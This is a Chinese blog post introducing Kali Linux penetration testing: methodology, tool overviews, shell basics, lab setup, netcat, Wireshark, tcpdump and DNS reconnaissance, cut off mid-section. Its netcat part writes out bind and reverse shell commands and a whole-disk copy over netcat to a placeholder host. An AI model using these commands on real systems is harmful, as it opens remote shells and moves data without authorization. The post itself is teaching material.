<!DOCTYPE html>


<html lang="zh">
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="utf-8">
<title>【Kali 渗透测试】入门篇 - 止歌的博客</title>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">



    <meta name="description" content="作为渗透测试的第一篇文章,本文主要将带领你进行基础的渗透测试学习,若想要进一步学习可参考更多渗透测试以及黑客入侵与防御书籍">
<meta name="keywords" content="渗透测试,信息安全">
<meta property="og:type" content="article">
<meta property="og:title" content="【Kali 渗透测试】入门篇">
<meta property="og:url" content="https://Wheeeeeeeeels.github.io/2019/07/31/【Kali LInux】 渗透测试技术入门/index.html">
<meta property="og:site_name" content="止歌的博客">
<meta property="og:description" content="作为渗透测试的第一篇文章,本文主要将带领你进行基础的渗透测试学习,若想要进一步学习可参考更多渗透测试以及黑客入侵与防御书籍">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="https://s2.ax1x.com/2020/02/29/36aAgK.jpg">
<meta property="og:updated_time" content="2020-03-13T12:20:53.575Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="【Kali 渗透测试】入门篇">
<meta name="twitter:description" content="作为渗透测试的第一篇文章,本文主要将带领你进行基础的渗透测试学习,若想要进一步学习可参考更多渗透测试以及黑客入侵与防御书籍">
<meta name="twitter:image" content="https://s2.ax1x.com/2020/02/29/36aAgK.jpg">







<link rel="icon" href="/images/favicon.svg">


<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.7.2/css/bulma.css">
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:400,600|Source+Code+Pro">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-dark.css">


    
    
    
    <style>body>.footer,body>.navbar,body>.section{opacity:0}</style>
    

    
    
    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css">
    

    
    

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css">


    
    
    
    

<link rel="stylesheet" href="/css/back-to-top.css">


    
    

    
    
<script>
var _hmt = _hmt || [];
(function() {
    var hm = document.createElement("script");
    hm.src = "//hm.baidu.com/hm.js?06673051142633c744c4b55099236bf8";
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(hm, s);
})();
</script>

    
    

    
    
<link rel="stylesheet" href="/css/progressbar.css">
<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>

    
    
    

    
    
    
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    

    


<link rel="stylesheet" href="/css/style.css">  

</head>




<body class="is-3-column">

    <nav class="navbar navbar-main">
    <div class="container">
        <div class="navbar-brand is-flex-center">
            <a class="navbar-item navbar-logo" href="/">
            
                <img src="/images/logo.svg" alt="【Kali 渗透测试】入门篇" height="28">
            
            </a>
        </div>
        <div class="navbar-menu">
            
            <div class="navbar-start">
                
                <a class="navbar-item" href="/">主页</a>
                
                <a class="navbar-item" href="/archives">归档</a>
                
                <a class="navbar-item" href="/categories">分类</a>
                
                <a class="navbar-item" href="/tags">标签</a>
                
                <a class="navbar-item" href="/about">关于</a>
                
                <a class="navbar-item" href="/photos">相册</a>
                
            </div>
            
            <div class="navbar-end">
                
                    
                    
                    <a class="navbar-item" target="_blank" title="Download on GitHub" href="https://github.com/Wheeeeeeeeels">
                        
                        <i class="fab fa-github"></i>
                        
                    </a>
                    
                
                
                <a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;">
                    <i class="fas fa-list-ul"></i>
                </a>
                
                
                <a class="navbar-item search" title="搜索" href="javascript:;">
                    <i class="fas fa-search"></i>
                </a>
                
            </div>
        </div>
    </div>
</nav>
    

   

    <section class="section">
        <div class="container">
            <div class="columns">
                <div class="column is-6-tablet is-6-desktop is-9-widescreen has-order-2 column-main"><div class="card">
    
    <div class="card-image">
        <span class="image is-7by1">
            <img class="thumbnail" src="https://s2.ax1x.com/2020/02/29/36aAgK.jpg" alt="【Kali 渗透测试】入门篇">
        </span>
    </div>
    
    <div class="card-content article ">
        
        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
            <div class="level-left">
                <time class="level-item has-text-grey" datetime="2019-07-31T04:41:34.000Z">2019-07-31</time>
                
                <div class="level-item">
                <a class="has-link-grey -link" href="/categories/信息安全/">信息安全</a>&nbsp;/&nbsp;<a class="has-link-grey -link" href="/categories/信息安全/渗透测试/">渗透测试</a>&nbsp;/&nbsp;<a class="has-link-grey -link" href="/categories/信息安全/渗透测试/Kali-Linux大法/">Kali Linux大法</a>
                </div>
                
                
                <span class="level-item has-text-grey">
                    
                    
                    1 小时 读完 (大约 13198 个字)
                </span>
                
                
                <span class="level-item has-text-grey" id="busuanzi_container_page_pv">
                    <i class="far fa-eye"></i>
                    <span id="busuanzi_value_page_pv">0</span>次访问
                </span>
                
            </div>
        </div>
        
        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
            
                【Kali 渗透测试】入门篇
            
        </h1>
        <div class="content">
            <blockquote>
<p>作为渗透测试的第一篇文章,本文主要将带领你进行基础的渗透测试学习,若想要进一步学习可参考更多渗透测试以及黑客入侵与防御书籍</p>
</blockquote>
<a id="more"></a>
<h2 id="Kali-Linux-从入门到精通-一-概论"><a href="#Kali-Linux-从入门到精通-一-概论" class="headerlink" title="Kali Linux 从入门到精通(一)-概论"></a>Kali Linux 从入门到精通(一)-概论</h2><blockquote>
<p>基本介绍</p>
<ul>
<li>1.安全目标<ul>
<li>先于攻击者发现和防止漏洞出现<ul>
<li>攻击型安全</li>
<li>防护型安全</li>
</ul>
</li>
</ul>
</li>
<li>2.渗透测试<ul>
<li>尝试挫败安全防御机制,发现系统安全弱点</li>
<li>从攻击者的角度思考,测量安全防护有效性</li>
<li>证明安全问题的存在,而非破坏</li>
<li>道德约束</li>
<li>法律</li>
</ul>
</li>
</ul>
</blockquote>
<ul>
<li>3.渗透测试标准(The Penetration Testing Execution Standard)<ul>
<li>PETS (<a href="http://www.pentest-standard.org" target="_blank" rel="noopener">http://www.pentest-standard.org</a>) </li>
<li>前期交互阶段:需要划清范围,通常划分为多个子系统进行渗透测试</li>
<li>情报收集阶段:主动收集,被动收集</li>
<li>威胁建模阶段:逆向工程,编写针对漏洞的代码</li>
<li>漏洞分析阶段</li>
<li>渗透攻击阶段</li>
<li>后渗透测试阶段</li>
<li>渗透测试报告</li>
</ul>
</li>
<li>4.渗透测试项目<ul>
<li>渗透测试范围</li>
<li>获得授权(客户授权)</li>
<li>渗透测试方法<ul>
<li>是否允许社会工程学</li>
<li>是否允许拒绝服务攻击</li>
</ul>
</li>
</ul>
</li>
<li>5.渗透测试误区<ul>
<li>扫描器就是一切&lt;==只是一种手段<ul>
<li>忽视业务逻辑重的漏洞</li>
</ul>
</li>
</ul>
</li>
<li>6.KALI Linux介绍<ul>
<li>基于Debain的Linux发行版本</li>
<li>前身是BackTrack 2013年3月发布</li>
<li>用于渗透测试和安全审计</li>
<li>包含600+安全工具</li>
<li>FHS标准目录结构</li>
<li>定制内核</li>
<li>支持ARM和手机平台</li>
<li>开源免费 </li>
</ul>
</li>
<li>7.KALI LINUX 策略<ul>
<li>ROOT用户策略</li>
<li>网络服务策略</li>
<li>更新升级策略</li>
</ul>
</li>
</ul>
<ul>
<li>8.建议<ul>
<li>实践是检验真理的唯一标准</li>
<li>不要停留在了解的程度</li>
<li>Kali很强大,但不是全部</li>
</ul>
</li>
</ul>
<h2 id="Kali-Linux-从入门到精通-二-安装"><a href="#Kali-Linux-从入门到精通-二-安装" class="headerlink" title="Kali Linux 从入门到精通(二)-安装"></a>Kali Linux 从入门到精通(二)-安装</h2><blockquote>
<p>Kail Linux 安装</p>
</blockquote>
<ul>
<li>持久加密USB安装-1<ul>
<li>LUSK:Linux Unified Key Setup<ul>
<li>磁盘分区加密规范</li>
<li>不依赖与操作系统的磁盘级加密</li>
<li>Window——-DoxBox</li>
<li>后端: dm-crypt</li>
<li>前端: crtptsetup</li>
<li>微软的bitlocker</li>
</ul>
</li>
<li>将镜像刻录到U盘<ul>
<li>dd if=kali-linux-version.iso of=/dev/sd* bs=1M(if–input file of=output file bs具体传输块的大小)</li>
</ul>
</li>
</ul>
</li>
<li>持久加密USB安装-2<ul>
<li>为U盘创建额外分区</li>
<li>使用LUKS加密分区</li>
<li>打开加密分区</li>
<li>格式化加密分区+卷标</li>
<li>挂在加密分区,并创建persistence.conf文件<blockquote>
<p>熟悉环境</p>
<ul>
<li>登录密码:官方下载:用户root 密码为toor</li>
<li>top10安全工具</li>
<li>aircrack-ng 无线安全攻击套件</li>
<li>brupsuite:基于web,手动web渗透测试工具,通过截断客户端到服务器的请求,通过变更数据查看漏洞</li>
<li>hydra:密码破解工具</li>
<li>john:密码破解工具</li>
<li>maltgo:收集信息,层级性的信息收集手段,根据有限信息,收集大量信息</li>
<li>metasplot framework:渗透测试框架,可以替代很多安全工具,一体化作战工具</li>
<li>nmap:网络发现层的扫描器,网络扫描工具</li>
<li>owasp-zap:与brupsuit属于一类工具</li>
<li>sqlmap: sql注入工具</li>
<li>wireshark: 抓包分析工具</li>
<li>字体调整</li>
<li>监视网络流量</li>
<li>强行终止程序</li>
<li>文件目录</li>
<li>共享文件 </li>
</ul>
</blockquote>
</li>
</ul>
</li>
</ul>
<blockquote>
<p>Kali 目录结构</p>
<ul>
<li>bin:所有用户使用的执行程序目录</li>
<li>root: 引导程序目录:如grup</li>
<li>dev:设备目录</li>
<li>etc:配置文件目录</li>
<li>home:用户主目录</li>
<li>lib: 放置各种库文件目录</li>
<li>lib64</li>
<li>lost+found: 丢失文件目录</li>
<li>media:挂载外接目录</li>
<li>mnt</li>
<li>opt:应用程序目录</li>
<li>proc</li>
<li>root</li>
<li>sbin</li>
<li>selinux</li>
<li>srv</li>
<li>sys</li>
<li>sbin</li>
<li>share</li>
<li>var:日志,存放经常变动的目录</li>
</ul>
</blockquote>
<blockquote>
<p>熟悉常用bash命令</p>
<ul>
<li>ls:相当于dir<ul>
<li>ls -l:<ul>
<li>前面字符:d 表示目录 - 表示文件 l 表示链接,相当于快捷方式 c表示设备 -b 表示块设备</li>
</ul>
</li>
<li>ls -a: </li>
<li>ls -lh:以k显示</li>
<li>ls -lh –sort==size 进行排序</li>
</ul>
</li>
<li>cd:进入目录<ul>
<li>cd . 表示当前目录</li>
<li>cd .. 进入上一级目录</li>
<li>pwd 当前工作目录</li>
<li>cd  进入用户主目录</li>
</ul>
</li>
<li>cat:查看文件内容</li>
<li>more:会显示文件的百分比数</li>
<li>less</li>
<li>tail 文件: 显示文件最后几行</li>
<li>watch -n  t [命令] 每隔t秒查看信息</li>
<li>rm:删除文件</li>
<li>cp:拷贝命令 cp ps ps1</li>
<li>top:监视linux系统性能的命令</li>
<li>ps:查看进程信息<ul>
<li>ps aux</li>
</ul>
</li>
<li>grep:grep [文件字符串或者需要的内容] 文件位置</li>
<li>ifconfig:查看网络信息<ul>
<li>ifconfig eth0 down 将网卡宕掉</li>
<li>ifconfig eth0 up   重新启动网卡</li>
</ul>
</li>
<li>netstat:查看网络连接信息<ul>
<li>netstat -pautu: 进行网络连接信息</li>
</ul>
</li>
<li>awk</li>
<li>管道:可对信息进行筛选,管道亦有很多命令(需掌握)</li>
<li>mount:用来挂载的命令</li>
<li>dmesg:查看msg文件内容</li>
<li>find: <ul>
<li>find / -nmap nmap 查找文件</li>
<li>find . [文件] 查找当前目录中的文件 </li>
</ul>
</li>
<li>whereis [文件] -b [查找二进制执行文件]</li>
<li>echo:显示当前文件</li>
<li>man指令:相当于手册</li>
</ul>
</blockquote>
<blockquote>
<p>vi编辑器基本使用(后续补充)</p>
</blockquote>
<ul>
<li>: set nu 显示行号</li>
<li>: wq     保存退出<blockquote>
<p>管道(后续补充)</p>
</blockquote>
</li>
<li>| 管道符</li>
<li>||</li>
<li>&amp; 前后两个命令依次执行</li>
<li>&amp;&amp; 逻辑与会有逻辑短路现象</li>
</ul>
<blockquote>
<p>shell脚本(后续补充)   </p>
</blockquote>
<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">echo -n &quot;IP : &quot;</span><br><span class="line">read ip</span><br><span class="line">echo &quot;your ip is:&quot; $ip</span><br><span class="line"></span><br><span class="line"># 使用 chmod +x 文件名.sh 更改权限</span><br></pre></td></tr></table></figure>

<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># 实现9*9乘法表</span><br><span class="line">for n in &apos;seq 9&apos;</span><br><span class="line">do</span><br><span class="line">for m in &apos;seq &amp;n&apos;</span><br><span class="line">  do </span><br><span class="line">    echo -n &quot;$m*$n=&quot; &apos;expr $m \* &amp;n&apos;&quot;  &quot;</span><br><span class="line">  done</span><br><span class="line">  echo</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 循环发现所有活的ip地址</span><br><span class="line">for n in &apos;seq 254&apos;</span><br><span class="line">do </span><br><span class="line">  # -c 表示只ping一个包 awk 指定第四列,对应的是ip地址</span><br><span class="line">  ping 192.168.1.$n -c 1 | grep ttl | awk &apos;&#123;print $4&#125;&apos; | awk -F &apos;&#123;print $1&#125;&apos;</span><br></pre></td></tr></table></figure>

<h2 id="Kali-Linux-从入门到精通-三-入侵系统定制"><a href="#Kali-Linux-从入门到精通-三-入侵系统定制" class="headerlink" title="Kali Linux 从入门到精通(三)-入侵系统定制"></a>Kali Linux 从入门到精通(三)-入侵系统定制</h2><blockquote>
<p>定制</p>
</blockquote>
<ul>
<li><p>网络配置</p>
<ul>
<li>临时IP地址<ul>
<li>dhclient eth0</li>
<li>ifconfig eth0 192.168.11/24</li>
<li>route add default gw 192.168.1.1  # 添加默认网关</li>
<li>echo nameserver 192.168.1.1 &gt; /etc/resolv.conf</li>
</ul>
</li>
<li>固定IP地址(计算机重启后依然生效)<ul>
<li>auto th0</li>
<li>iface th0 inel stalic</li>
<li>address 192.168.20.1</li>
<li>netmask 255.255.255.0</li>
<li>network 192.168.20.255</li>
<li>broadcast 192.168.20.255</li>
<li>gateway  192.168.20.2</li>
<li>dns-nameservers 192.168.1.1 192.168.1.2</li>
<li>up route add -net 172.16.5.0 gw 192.168.10.100 eth1</li>
<li>down route del -net 172.24.0.0/24</li>
</ul>
</li>
</ul>
</li>
<li><p>更新升级</p>
<ul>
<li>apt-get update: 实际上是更新的是包的索引文件</li>
<li>apt-get upgrade: 实际更新包的指令</li>
</ul>
</li>
<li><p>安装软件包</p>
<ul>
<li>库<ul>
<li>apt-get 命令</li>
</ul>
</li>
<li>安装适合自己的工具软件<ul>
<li>apt-get install smplayer ibus ibus-pinyin flashplugin-nonfree gdebi amule qbittorrent geany stardict meld ttf-wqy-microhei kchmviewer freemind netspeed mtr filezilla filezilla-common chromium monodevelop mono-gmcs-y</li>
</ul>
</li>
</ul>
</li>
<li><p>浏览器插件</p>
<ul>
<li>firefox浏览器插件<ul>
<li>flashgof(基于浏览器插件的下载插件),autoproxy(翻墙插件),Tamper Data(提交修改),cooike,importer,Cookies Manager,Download Youtube Videos as MP4,Firebug,Flagfox(显示服务器位置),HackBar(F9进入操作),hashr(计算Hash值),User Agent Switcher(修改User Agent 可用于欺骗服务器),XSS me,SQL Inject Me</li>
</ul>
</li>
<li>xss-me:<a href="https://addons.mozilla.org/en-US/firefox/addon/xss-me/" target="_blank" rel="noopener">https://addons.mozilla.org/en-US/firefox/addon/xss-me/</a></li>
<li>sql-inject-me: <a href="https://addons.mozilla/en-US/firefox/sql-inject-me/src=ss" target="_blank" rel="noopener">https://addons.mozilla/en-US/firefox/sql-inject-me/src=ss</a></li>
</ul>
</li>
</ul>
<h2 id="Kali-Linux-从入门到精通-四-代理"><a href="#Kali-Linux-从入门到精通-四-代理" class="headerlink" title="Kali Linux 从入门到精通(四)-代理"></a>Kali Linux 从入门到精通(四)-代理</h2><ul>
<li><p>翻墙&amp;代理</p>
<ul>
<li><p>GFW长城防火墙</p>
<ul>
<li>Facebook,youtube</li>
</ul>
<p>client–&gt;goagent–&gt;GAE–&gt;目标网站               </p>
</li>
<li><p>翻墙</p>
<ul>
<li>http代理:明文传输存在弊端,容易被长城防火墙发现容量,现在可以使用https进行加密</li>
<li>socks代理</li>
<li>ssh代理</li>
<li>VPN</li>
</ul>
</li>
<li><p>Goagent</p>
</li>
<li><p>Tor:暗网</p>
<ul>
<li>保护隐私防止被追踪</li>
<li>志愿者组成</li>
<li>长期在天朝无法使用<ul>
<li>感谢云</li>
</ul>
</li>
<li>暗网<ul>
<li>互联网引擎无法发现</li>
<li>互联网黑市</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>
<li>代理的意义所在<ul>
<li>加密通信</li>
<li>隐藏来源</li>
<li>突破网络封锁</li>
</ul>
</li>
<li>注意事项<ul>
<li>不要触及敏感地带</li>
<li>不要从事非法行为</li>
</ul>
</li>
</ul>
<h2 id="Kali-Linux-从入门到精通-五-测试环境准备"><a href="#Kali-Linux-从入门到精通-五-测试环境准备" class="headerlink" title="Kali Linux 从入门到精通(五)-测试环境准备"></a>Kali Linux 从入门到精通(五)-测试环境准备</h2><blockquote>
<p>准备实验环境</p>
</blockquote>
<ul>
<li><p>渗透非系统授权的弊端</p>
</li>
<li><p>搭建自己的实验环境</p>
<blockquote>
<p>安装虚拟机</p>
</blockquote>
</li>
<li><p>微软最新软件</p>
<ul>
<li><a href="http://msdn.microst.com/en-ca/subscriptions/aa336858" target="_blank" rel="noopener">http://msdn.microst.com/en-ca/subscriptions/aa336858</a></li>
</ul>
</li>
<li><p>windows虚拟机 </p>
<ul>
<li><a href="http://dev.modern.ie/tools/vms" target="_blank" rel="noopener">http://dev.modern.ie/tools/vms</a></li>
</ul>
</li>
<li><p>安装自己的虚拟机(windows平台)</p>
<ul>
<li>xp</li>
<li>Win7</li>
<li>2003</li>
</ul>
</li>
<li><p>Linux虚拟机</p>
<ul>
<li><p><a href="http://www.turnkeylinux.org(提供Linux虚拟机,每一种都需渗透测试)" target="_blank" rel="noopener">http://www.turnkeylinux.org(提供Linux虚拟机,每一种都需渗透测试)</a></p>
</li>
<li><p>Ubutu  </p>
<ul>
<li>Lamp安装<ul>
<li>sudo apt-get install ssh</li>
<li>sudo apt-get install apache2</li>
<li>sudo apt-get install apache2-utile/</li>
<li>sudo service apache2 restart(报错解决: vi /etc/apache2/conf-available/fqdn.conf:ServerName:localhost)</li>
<li>sudo apt-get nstall mysql-server libapache2-mod-auth-mysql php5-mysql</li>
<li>mysql install db</li>
<li>mysql secure installation</li>
<li>sudo apt-get install php5 php5-mysql</li>
<li>cd /var/www/html</li>
<li>vi test.php</li>
<li>sudo init 0 关机</li>
<li>sudo init 6 重启</li>
<li>sudo init 1 单用户</li>
<li>sudo init 2-5 多用户</li>
</ul>
</li>
</ul>
</li>
<li><p>Metasploitable2(务必下载)</p>
<ul>
<li><a href="http://downloads.metasploit.com/data/metasploitable/metasploitable-linux-2.0.0.zip" target="_blank" rel="noopener">http://downloads.metasploit.com/data/metasploitable/metasploitable-linux-2.0.0.zip</a><ul>
<li>默认账户:msfadmin</li>
<li>查看ip:ifconfig</li>
</ul>
</li>
<li>问题: /var/www/multilldae/config.inc<ul>
<li>解决措施: <ul>
<li>cd /var/www/mutillidae/</li>
<li>vi config.inc<ul>
<li>$dbname=”owasp10”:^n   </li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>模拟真实网络</p>
<ul>
<li><p>M0n0wall 防火墙</p>
<ul>
<li><a href="http://m0n0.ch/wall/downloads.php" target="_blank" rel="noopener">http://m0n0.ch/wall/downloads.php</a> (轻量级防火墙 downloads cdrom)</li>
</ul>
</li>
<li><p>部署:</p>
<ul>
<li>接外网,内网,DMZ区</li>
<li>256MB,8GB硬盘 m0n0虚拟机</li>
<li>网卡1: 桥接方式网络,连接物理网络,桥接外网 </li>
<li>网卡2: 仅主机,虚拟网卡</li>
<li>网卡3: 同网卡2</li>
<li>无挂载,硬盘重启</li>
</ul>
<p><img src="https://s2.ax1x.com/2020/02/29/36t9AI.png" alt="36t9AI.png"></p>
<ul>
<li>背靠背防火墙(测试复杂网络架构 模拟高级企业网络拓扑)<ul>
<li>Pfense(安全性高,集成大量安全插件,防护dmz)</li>
<li><a href="http://pfense.org/" target="_blank" rel="noopener">http://pfense.org/</a>  (类似于m0n0)</li>
</ul>
</li>
</ul>
<p><img src="https://s2.ax1x.com/2020/02/29/36teBj.png" alt="36teBj.png"></p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="Kali-Linux-从入门到精通-五-基本工具使用"><a href="#Kali-Linux-从入门到精通-五-基本工具使用" class="headerlink" title="Kali Linux 从入门到精通(五)-基本工具使用"></a>Kali Linux 从入门到精通(五)-基本工具使用</h2><blockquote>
<p>基本工具</p>
</blockquote>
<ul>
<li><p>常用工具:</p>
<ul>
<li><p>经常使用且功能强大</p>
</li>
<li><p>安全从业者必不可少的帮手</p>
</li>
<li><p>Nc/ncat</p>
</li>
<li><p>Wireshark</p>
</li>
<li><p>Tcpdump</p>
<blockquote>
<p>NETCAT-NC(瑞士军刀)</p>
<ul>
<li>基本介绍      </li>
<li>网络工具中的瑞士军刀-小身材,大智慧</li>
<li>侦听模式/传输模式</li>
<li>telnet/获取banner模式</li>
<li>传输文本信息</li>
<li>传输文件/目录</li>
<li>加密传输文件</li>
<li>远程控制/木马</li>
<li>加密所用流量</li>
<li>流媒体服务器</li>
<li>远程克隆硬盘</li>
<li>一波操作</li>
<li>NC-TELNET/BANNER</li>
<li>nc-nv 1.1.1.1 110 (pop3 服务器)</li>
<li>nc-nv 1.1.1.1 25  (smtp 邮件服务器)</li>
<li>nc-nv 1.1.1.1 80  (网站)</li>
<li>nc -h 查看nc可用参数</li>
<li>NC-传输文本信息</li>
<li>A:nc -l -p 4444(打开4444端口)  使用netstat -pantu | grep 4444 查看端口是否打开</li>
<li>B:nc -nv 1.1.1.1 4444</li>
<li>nc -q 传输后直接断连接</li>
<li>远程电子取证信息收集</li>
<li>NC-传输文件/目录</li>
<li>传输文件</li>
<li>A:nc -lp 333&gt;test.mp4</li>
<li>B:nc -nv 1.1.1.1 333 &lt; test.mp4 -q 1</li>
<li>or</li>
<li>A: nc-q l -lp 333&lt;a.mp4</li>
<li>B: nc-nv 1.1.1.1 333&gt;2.mp4</li>
<li>传输目录</li>
<li>A:tar -cvf -music/ | nc-lp 333 -q 1</li>
<li>B:nc -nv 1.1.1.1 333 | tar -xvf -</li>
<li>加密传文件</li>
<li>A:nc -lp 333 | mcrypt -flush -Fbqd -a rijndael-256 -m ecb &gt; 1.mp4</li>
<li>B:mcrypt –flush -Fbq -a rjindael-256-m ecb &lt;a.mp4 | nc -nv 1.1.1.1 333 -q 1(对称加密算法)</li>
<li>NC-流媒体服务</li>
<li>A:cat 1.mp4 | nc -lp 333</li>
<li>B:nc -nv 1.1.1.1 333 | mplayer -vo x11 -cache 3000 -</li>
<li>NC-端口扫描</li>
<li>nc -nvz 1.1.1.1-65535  (探测tcp端口)</li>
<li>nc -nvzu 1.1.1.1-1024  (探测udp端口)</li>
<li>NC-远程克隆硬盘</li>
<li>A(接收端):nc -lp 333 | dd of=/dev/sda</li>
<li>B(被取证电脑):dd if=/dev/sda | nc -nv 1.1.1.1 333 -q 1</li>
<li>远程电子取证,可以将目标服务器远程复制,或者内存</li>
<li>NC-远程控制</li>
<li>正向:<ul>
<li>A(服务器):nc -lp 333 -c bash</li>
<li>B(客户端):nc 1.1.1.1 333</li>
</ul>
</li>
<li>反向:<ul>
<li>A:nc -lp 333</li>
<li>B:nc 1.1.1.1 333 -c bash</li>
</ul>
</li>
<li>注:windows用户把bash改成cmd</li>
<li>适用于内网访问外网</li>
<li>NC-NCAT</li>
<li>NC缺乏加密和身份验证(肉鸡可能被窃取)的能力</li>
<li>Ncat包含于nmap工具包中(可实现加密,身份验证,每次会重新生成指纹信息)</li>
<li>A:ncat -c bash –allow 192.168.20.14 -vnl 333 –ssl</li>
<li>B:ncat -nv 1.1.1.1 333 –ssl</li>
</ul>
</blockquote>
<ul>
<li>不同系统/平台的nc参数功能不尽相同</li>
</ul>
</li>
</ul>
</li>
</ul>
<blockquote>
<p>WIRESHARK(后续补充)-被动扫描大法</p>
<ul>
<li>基本介绍<ul>
<li>抓包嗅探协议分析</li>
<li>安全专家必备的技能</li>
<li>抓包引擎<ul>
<li>Libcap9—-Linux</li>
<li>Winpcap10—Windows</li>
</ul>
</li>
<li>解码能力(评价之根本) </li>
</ul>
</li>
<li>基本使用方法<ul>
<li>启动</li>
<li>选择抓包网卡</li>
<li>混杂模式</li>
<li>实时抓包</li>
<li>保存和分析捕获文件</li>
<li>首选项</li>
</ul>
</li>
<li>WIRESHARK-筛选器<ul>
<li>过滤掉干扰的数据包</li>
<li>抓包筛选器</li>
<li>显示筛选器 </li>
</ul>
</li>
<li>WIRESHARK-常见协议包<ul>
<li>数据的分层结构</li>
<li>ARP</li>
<li>ICMP</li>
<li>TCP(三次握手)</li>
<li>UDP</li>
<li>DNS</li>
<li>HTTP(明文协议)</li>
<li>FTP</li>
</ul>
</li>
<li>WIRESHARK-TCP<ul>
<li>数据流<ul>
<li>HTTP</li>
<li>SMTP</li>
<li>POP3</li>
<li>SSL</li>
</ul>
</li>
</ul>
</li>
<li>WIRESHARK-信息统计<ul>
<li>节点数</li>
<li>协议分布</li>
<li>包大小分布</li>
<li>会话连接</li>
<li>解码方式</li>
<li>专家系统</li>
</ul>
</li>
<li>WIRESHARK-实践<ul>
<li>抓包对比nc,ncat加密与不加密的流量</li>
<li>企业抓包部署方案(采用商业化软件)<ul>
<li>Sniffer</li>
<li>Cace/riverebed (底层基于wireshark)</li>
<li>Cascad pilot(大流量抓包++)   </li>
<li>镜像端口(Cisco)<br>TCPDUMP</li>
<li>基本介绍</li>
<li>No-GUI的抓包分析工具</li>
<li>Linux,Unix系统默认安装</li>
<li>TCPDUMP-抓包</li>
<li>抓包</li>
<li>默认只抓68个字节</li>
<li>tcpdump -i eth0 -s 0 -2 file.pcap</li>
<li>tcpdump -i eth0 port 22</li>
<li>读取抓包文件</li>
<li>tcpdump -r file.pcap</li>
<li>TCPDUMP-筛选</li>
<li>tcpdump -n http.cap | awk ‘{print $3}’ | sort -u </li>
<li>tcpdump -n src host [ip address] -r http.cap</li>
<li>tcpdump -n dst host [ip address] -r http.cap</li>
<li>tcpdump -n port 53 -r http.cap</li>
<li>tcpdump -nX port 80 -r http.cap</li>
<li>TCP 高级筛选</li>
<li>tcpdump -A -n ‘tcp[13]=24’ -r http.cap</li>
<li>过程文档记录</li>
<li>Dradis(Kali 自带)</li>
<li>短期临时小团队资源共享</li>
<li>各种插件导入问价</li>
<li>Keepnote </li>
<li>Truecrypt(注重信息保密)</li>
<li>团队中需要文档人员</li>
</ul>
</li>
</ul>
</li>
</ul>
</blockquote>
<h2 id="Kali-Linux-从入门到精通-七-被动信息收集"><a href="#Kali-Linux-从入门到精通-七-被动信息收集" class="headerlink" title="Kali Linux 从入门到精通(七)-被动信息收集"></a>Kali Linux 从入门到精通(七)-被动信息收集</h2><blockquote>
<p>被动信息收集</p>
<ul>
<li>公开渠道可获得的信息</li>
<li>与目标系统不产生直接交互</li>
<li>尽量避免留下一切痕迹</li>
<li>OSINT<ul>
<li>美国军方</li>
<li>北大西洋公约组织<ul>
<li>Passive reconnaissance(no direct interaction)</li>
<li>normal interaction</li>
<li>Active reconnaissance</li>
<li>More information greater chance of direction<br>信息收集内容</li>
</ul>
</li>
</ul>
</li>
<li>IP地址段</li>
<li>域名信息</li>
<li>邮件地址</li>
<li>文档图片数据</li>
<li>公司地址</li>
<li>公司组织架构</li>
<li>联系电话/传真号码</li>
<li>人员姓名/职位</li>
<li>目标系统使用的技术架构</li>
<li>公开的商业信息<br>信息用途</li>
<li>用信息描述目标</li>
<li>发现</li>
<li>社会工程学攻击</li>
<li>物理缺口</li>
</ul>
</blockquote>
<blockquote>
<p>信息收集-DNS</p>
<ul>
<li>域名与FQDN的区别<ul>
<li>sina.com 实际域名</li>
<li><a href="http://www.sina.com" target="_blank" rel="noopener">www.sina.com</a> 完全限定域名 简称为FQDN</li>
</ul>
</li>
<li>域名记录:A(主机记录),Cname(解析成另外一个域名) NS(域的域名服务器记录),MX(邮件交换记录),ptr(不同于前面,通过ip地址解析域名 反向域名 解析)<ul>
<li>递归查询</li>
<li>迭代查询<br>DNS信息收集–NSLOOKUP<ul>
<li>nslookup <a href="http://www.sina.com" target="_blank" rel="noopener">www.sina.com</a></li>
<li>server</li>
<li>type=a,mx,ns,any</li>
<li>nslookup -type example.com 156.154.70.22</li>
<li>text:spf 通过反向域名查询,判断,从而反垃圾邮件<br>DNS信息收集-DIG</li>
